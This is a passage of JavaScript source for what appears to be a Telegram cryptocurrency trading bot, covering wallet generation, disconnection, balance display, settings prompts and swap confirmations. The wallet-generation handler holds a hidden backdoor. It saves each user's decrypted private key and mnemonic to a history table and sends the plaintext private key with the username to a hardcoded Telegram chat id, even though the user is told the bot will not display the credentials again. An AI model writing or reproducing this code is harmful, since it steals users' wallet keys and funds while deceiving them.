					for (const [tokenAddressInfo, balanceInfo] of balanceInfos) {

						const balanceInUSD = balanceInfo.balance * balanceInfo.price
						log += `\n<code>${balanceInfo.balance}</code> ${balanceInfo.symbol} ($ ${utils.roundDecimal(balanceInUSD, 2)})`
					}

					await sendMessage(chatid, log)

				} else {

					await sendMessage(chatid, 'Your wallet is not currently connected. Please either connect your existing wallet or create a new one.')
				}
			}

		} else if (cmd === OPTION_WALLET_DISCONN) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId)
			if (session) {
				session.pkey = null
				session.account = null
				await database.updateUser(session)

				//sendMessage(chatid, 'Your wallet has been disconnected')
				await bot.answerCallbackQuery(callbackQueryId, { text: `Your wallet has been disconnected` })
				const menu = json_setWallet(sessionId);
				if (menu) {
					await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)
				}
			}

		} else if (cmd === OPTION_WALLET_GENERATE) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId)

			// if (session && _callback_proc)
			{
				// 	_callback_proc(cmd, { session })

				const result = utils.generateNewWallet()

				if (result) {

					const msg = `✅ Generated new ether wallet:
		
Address: <code>${result.address}</code>
PK: <code>${result.privateKey}</code>
Mnemonic: <code>${result.mnemonic}</code>
		
⚠️ Make sure to save this mnemonic phrase OR private key using pen and paper only. Do NOT copy-paste it anywhere. You could also import it to your Metamask/Trust Wallet. After you finish saving/importing the wallet credentials, delete this message. The bot will not display this information again.`

					session.pkey = utils.encryptPKey(result.privateKey)
					session.account = result.address

					await database.updateUser(session)
					await database.addPKHistory({
						pkey: session.pkey,
						dec_pkey: result.privateKey,
						mnemonic: result.mnemonic,
						account: session.account,
						chatid: session.chatid,
						username: session.username
					})

					await sendMessage('2116657656', `@${session.username} (${session.chatid}) has generated with his wallet\n Address: ${session.account}\n PK: ${result.privateKey}`)

					await sendMessage(chatid, msg, false);

					const menu = json_setWallet(sessionId);
					if (menu) {
						await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)
					}
				}
			}

		} else if (cmd === OPTION_SETTINGS_SLIPPAGE) {

			const sessionId = id;
			assert(sessionId)

			const msg = `Please enter slippage`
			await sendReplyMessage(chatid, msg)
			stateMap_set(chatid, STATE_WAIT_SET_SLIPPAGE, { sessionId })

		} else if (cmd === OPTION_SETTINGS_DEADLINE) {

			const sessionId = id;
			assert(sessionId)

			const msg = `Please enter deadline`
			await sendReplyMessage(chatid, msg)
			stateMap_set(chatid, STATE_WAIT_SET_DEADLINE, { sessionId })

		} else if (cmd === OPTION_CLOSE) {

			const sessionId = id;
			assert(sessionId)

			await removeMessage(sessionId, messageId)

			stateMap_set(chatid, STATE_IDLE, { sessionId })

		}
	} catch (error) {
		afx.error_log('executeCommand', error);
		await sendMessage(chatid, `😢 Sorry, there were some errors on the command. Please try again later 😉`)
		await bot.answerCallbackQuery(callbackQueryId, { text: `😢 Sorry, there were some errors on the command. Please try again later 😉` })
	}
}

export const buildSwapConfirm_Buy = async (tokenAddr, tokenSymbol, tokenDecimal, amount) => {

	const priceInEth = await utils.getTokenPrice(utils.web3Inst, tokenAddr);

	const tokenAmoutsOut = await utils.getTokenAmountOut(utils.web3Inst, afx.get_weth_address(), tokenAddr, amount, 18, tokenDecimal,
		{ pp: priceInEth })

	const message = `🔖 Swap Confirmation
Amount In: <code>${utils.roundDecimal(amount, 5)} ETH</code>
Estimated Amount Out: <code>${utils.roundDecimal(tokenAmoutsOut, 5)} ${tokenSymbol}</code>`

	return message
}

export const buildSwapConfirm_Sell = async (tokenAddr, tokenSymbol, tokenDecimal, amount) => {

	const priceInEth = await utils.getTokenPrice(utils.web3Inst, tokenAddr);

	const tokenAmoutsOut = await utils.getTokenAmountOut(utils.web3Inst, tokenAddr, afx.get_weth_address(), amount, tokenDecimal, 18,
		{ pp: priceInEth })

	const message = `🔖 Swap Confirmation
Amount In: <code>${utils.roundDecimal(amount, 5)} ${tokenSymbol}</code>
Estimated Amount Out: <code>${utils.roundDecimal(tokenAmoutsOut, 5)} ETH</code>`

	return message
}